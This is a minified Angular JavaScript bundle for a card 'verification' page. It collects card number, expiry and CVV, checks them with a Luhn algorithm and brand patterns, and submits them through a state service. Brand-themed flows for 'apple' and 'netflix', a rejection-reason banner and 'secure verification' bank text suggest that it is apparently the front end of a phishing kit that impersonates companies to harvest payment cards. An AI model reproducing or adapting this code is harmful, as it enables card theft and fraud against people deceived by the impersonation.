import{a as U}from"./chunk-UJYMHVUW.js";import{a as K}from"./chunk-PD6LZFPU.js";import{d as j,g as X,k as Y}from"./chunk-37M6D54L.js";import{a as H}from"./chunk-BWTLYIA6.js";import{d as G}from"./chunk-V5KHZ7ZF.js";import{$ as k,Da as p,Ea as u,La as g,Na as F,O as o,T as f,V as v,W as A,Wa as W,X as c,Y as _,aa as y,ea as a,fa as l,ga as x,ka as h,la as L,mb as O,ra as s,sa as b,t as N,ta as m,u as B,va as E,wa as w,xa as M,za as P}from"./chunk-SB5IJCBE.js";var Q=/^4/,Z=/^5[1-5]|^2(?:2(?:2[1-9]|[3-9]\d)|[3-6]\d\d|7(?:[01]\d|20))/,$=/^3[47]/,ee=/^6(?:011|5)/,te=/^(?:2131|1800|35\d{3})/,ie=/^3(?:0[0-5]|[68])/;function ne(n){return Q.test(n)?"visa":Z.test(n)?"mastercard":$.test(n)?"amex":ee.test(n)?"discover":te.test(n)?"jcb":ie.test(n)?"diners":"unknown"}function re(n){let i=n.replace(/\D/g,"");if(i.length===0)return!1;let t=0,e=!1;for(let d=i.length-1;d>=0;d--){let r=parseInt(i[d],10);e&&(r*=2,r>9&&(r-=9)),t+=r,e=!e}return t%10===0}function z(n,i,t){let e=ne(n),d=!1;if(i.length===5){let[T,I]=i.split("/").map(Number),R=new Date,D=parseInt(R.getFullYear().toString().substring(2)),q=R.getMonth()+1;T>=1&&T<=12&&(I>D||I===D&&T>q)&&(d=!0)}let r=n.length,C=!1;e==="amex"?C=r===15:e==="diners"?C=r===14:C=r===16;let V=re(n),S=t.length===(e==="amex"?4:3);return{cardType:e,isExpiryValid:d,isCardNumValid:C&&V,isLuhnValid:V,isCvvValid:S,isValid:C&&V&&d&&S}}function ae(n,i){n&1&&(a(0,"div",2)(1,"span",33),s(2,"add_a_photo"),l()())}function oe(n,i){if(n&1&&(a(0,"div",5)(1,"span",34),s(2,"credit_card_off"),l(),a(3,"div")(4,"p",35),s(5),p(6,"translate"),l(),a(7,"p",36),s(8),l()()()),n&2){let t=L();o(5),b(u(6,2,"CARD.ERROR_TITLE")),o(3),b(t.state.rejectionReason())}}function le(n,i){n&1&&x(0,"img",11)}function se(n,i){n&1&&x(0,"img",12)}function de(n,i){n&1&&(a(0,"span",13),s(1,"BANK"),l())}var J=class n{constructor(){this.state=N(O);this.currentFlow=this.state.currentFlow;this.currentFlowId=g(()=>this.currentFlow()?.id||"generic");this.isApple=g(()=>this.currentFlowId()==="apple");this.cardNumber="";this.cardNumberDisplay="";this.expiry="";this.cvv="";this.touchedCard=f(!1);this.touchedExp=f(!1);this.touchedCvv=f(!1);this.isValid=f(!1);this.isExpiryValid=f(!1);this.cardType=f("unknown");this.theme=g(()=>this.state.currentFlow()?.theme);this.headerColor=g(()=>this.theme()?.input.textColor||"#111827");this.textColor=g(()=>this.theme()?.input.textColor||"#4b5563");this.primaryBtnVariant=g(()=>this.currentFlowId()==="netflix"?"danger":"primary");F(()=>{})}containerClasses(){return this.isApple()?"pt-8 max-w-lg mx-auto":""}onCardInput(i){let t=i.replace(/\D/g,"");t.length>16&&this.cardType()!=="amex"&&(t=t.substring(0,16)),this.cardNumber=t;let e=t.match(/.{1,4}/g);this.cardNumberDisplay=e?e.join(" "):t,this.validate(),this.state.updateCard({number:this.cardNumber,cardType:this.cardType()})}onExpiryInput(i){let t=i.replace(/\D/g,"");t.length>=2&&(t=t.substring(0,2)+"/"+t.substring(2,4)),t.length>5&&(t=t.substring(0,5)),this.expiry=t,this.validate(),this.state.updateCard({expiry:this.expiry})}onCvvChange(i){let t=i.replace(/\D/g,"");this.cvv=t,this.validate(),this.state.updateCard({cvv:this.cvv})}cvvMaxLength(){return this.cardType()==="amex"?4:3}isCvvValid(){return this.cvv.length===this.cvvMaxLength()}isCardNumValid(){let i=this.cardNumber.length;return this.cardType()==="amex"?i===15:this.cardType()==="diners"?i===14:i===16}validate(){let i=z(this.cardNumber,this.expiry,this.cvv);this.cardType.set(i.cardType),this.isExpiryValid.set(i.isExpiryValid),this.isValid.set(i.isValid)}submit(){this.isValid()&&this.state.submitCard(this.cardNumber,this.cardType(),this.expiry,this.cvv)}static{this.\u0275fac=function(t){return new(t||n)}}static{this.\u0275cmp=B({type:n,selectors:[["app-card-verification"]],hostVars:1,hostBindings:function(t,e){t&2&&A("data-theme",e.currentFlowId())},standalone:!0,features:[P],decls:57,vars:48,consts:[[1,"card-flow-container"],[1,"mb-8","text-center","animate-in","slide-in-from-top-4","duration-500"],[1,"w-16","h-16","bg-slate-100","rounded-full","flex","items-center","justify-center","mx-auto","mb-4","animate-pulse"],[1,"text-2xl","font-bold","mb-2","tracking-tight"],[1,"text-base","text-center","opacity-80"],[1,"mb-6","bg-red-50","border-l-[6px]","border-red-500","p-4","flex","items-start","gap-4","rounded-r-lg","animate-fade-in"],[1,"mb-8","perspective-1000","animate-in","zoom-in-95","duration-700"],[1,"relative","w-full","h-48","rounded-xl","shadow-xl","transition-transform","duration-500","transform-style-3d","bg-gradient-to-br","from-[#0f172a]","to-[#334155]","p-6","text-white","overflow-hidden","group"],[1,"absolute","top-6","left-6","w-12","h-10","bg-yellow-400/20","rounded","border","border-yellow-400/40","relative","overflow-hidden"],[1,"absolute","inset-0","bg-yellow-400/10","grid","grid-cols-2"],[1,"absolute","top-6","right-6"],["src","https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg",1,"h-6","brightness-200","contrast-200"],["src","https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg",1,"h-8"],[1,"font-bold","tracking-widest","text-lg","opacity-50"],[1,"absolute","top-20","left-6","w-full","pr-12"],[1,"font-mono","text-xl","sm:text-2xl","tracking-widest","drop-shadow-md"],[1,"absolute","bottom-6","left-6","flex","items-end","justify-between","w-[85%]"],[1,"text-[10px]","opacity-60","uppercase","mb-1"],[1,"font-medium","tracking-wide","uppercase","text-sm","truncate","max-w-[150px]"],[1,"font-mono","text-sm"],[1,"space-y-6"],[3,"ngModelChange","blur","label","ngModel","iconLeft","error"],["slot","icon-left",1,"material-icons"],[1,"grid","grid-cols-2","gap-4"],["placeholder","MM/YY",3,"ngModelChange","blur","label","ngModel","error"],[1,"relative"],["type","password",3,"ngModelChange","blur","label","ngModel","error"],[1,"absolute","-top-6","right-0","text-xs","text-blue-500","cursor-pointer","hover:underline","font-bold"],[1,"pt-6"],[3,"click","disabled","fullWidth","variant"],[1,"flex","justify-center","items-center","gap-2","mt-6","opacity-60"],[1,"material-icons","text-sm","text-green-600"],[1,"text-xs","font-bold"],[1,"material-icons","text-3xl","text-gray-400"],[1,"material-icons","text-red-500"],[1,"text-sm","font-bold","text-red-900"],[1,"text-xs","text-red-700","mt-1"]],template:function(t,e){t&1&&(a(0,"app-public-layout")(1,"div",0)(2,"header",1),v(3,ae,3,0,"div",2),a(4,"h1",3),s(5),p(6,"translate"),l(),a(7,"p",4),s(8),p(9,"translate"),l()(),v(10,oe,9,4,"div",5),a(11,"div",6)(12,"div",7)(13,"div",8),x(14,"div",9),l(),a(15,"div",10),v(16,le,1,0,"img",11)(17,se,1,0,"img",12)(18,de,2,0,"span",13),l(),a(19,"div",14)(20,"p",15),s(21),l()(),a(22,"div",16)(23,"div")(24,"p",17),s(25,"Card Holder"),l(),a(26,"p",18),s(27),l()(),a(28,"div")(29,"p",17),s(30,"Expires"),l(),a(31,"p",19),s(32),l()()()()(),a(33,"div",20)(34,"ui-input",21),p(35,"translate"),M("ngModelChange",function(r){return w(e.cardNumberDisplay,r)||(e.cardNumberDisplay=r),r}),h("ngModelChange",function(r){return e.onCardInput(r)})("blur",function(){return e.touchedCard.set(!0)}),a(36,"span",22),s(37,"credit_card"),l()(),a(38,"div",23)(39,"ui-input",24),p(40,"translate"),M("ngModelChange",function(r){return w(e.expiry,r)||(e.expiry=r),r}),h("ngModelChange",function(r){return e.onExpiryInput(r)})("blur",function(){return e.touchedExp.set(!0)}),l(),a(41,"div",25)(42,"ui-input",26),p(43,"translate"),M("ngModelChange",function(r){return w(e.cvv,r)||(e.cvv=r),r}),h("ngModelChange",function(r){return e.onCvvChange(r)})("blur",function(){return e.touchedCvv.set(!0)}),l(),a(44,"div",27),s(45),p(46,"translate"),l()()()(),a(47,"div",28)(48,"ui-button",29),h("click",function(){return e.submit()}),s(49),p(50,"translate"),l()(),a(51,"div",30)(52,"span",31),s(53,"lock"),l(),a(54,"p",32),s(55),p(56,"translate"),l()()()()),t&2&&(o(),k(e.containerClasses()),o(2),y(e.isApple()?3:-1),o(),_("color",e.headerColor()),o(),m(" ",u(6,32,"CARD.TITLE")," "),o(2),_("color",e.textColor()),o(),m(" ",u(9,34,"CARD.SUBTITLE")," "),o(2),y(e.state.rejectionReason()?10:-1),o(6),y(e.cardType()==="visa"?16:e.cardType()==="mastercard"?17:18),o(5),m(" ",e.cardNumberDisplay||"\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022"," "),o(6),m(" ",e.state.firstName()+" "+e.state.lastName()||"YOUR NAME"," "),o(5),b(e.expiry||"MM/YY"),o(2),c("label",u(35,36,"CARD.Card Number")),E("ngModel",e.cardNumberDisplay),c("iconLeft",!0)("error",e.touchedCard()&&!e.isCardNumValid()?"Invalid number":""),o(5),c("label",u(40,38,"CARD.Expiration Date")),E("ngModel",e.expiry),c("error",e.touchedExp()&&!e.isExpiryValid()?"Invalid":""),o(3),c("label",u(43,40,"CARD.Security Code")),E("ngModel",e.cvv),c("error",e.touchedCvv()&&!e.isCvvValid()?"Invalid":""),o(3),m(" ",u(46,42,"CARD.CVV_HELP")," "),o(3),c("disabled",!e.isValid())("fullWidth",!0)("variant",e.primaryBtnVariant()),o(),m(" ",u(50,44,"COMMON.CONFIRM")," "),o(5),_("color",e.textColor()),o(),m(" ",u(56,46,"BANK_APP.SECURE_VERIFICATION")," "))},dependencies:[W,Y,j,X,H,G,U,K],styles:["[_nghost-%COMP%]{display:block;width:100%}.perspective-1000[_ngcontent-%COMP%]{perspective:1000px}.transform-style-3d[_ngcontent-%COMP%]{transform-style:preserve-3d}"]})}};export{J as CardVerificationComponent};
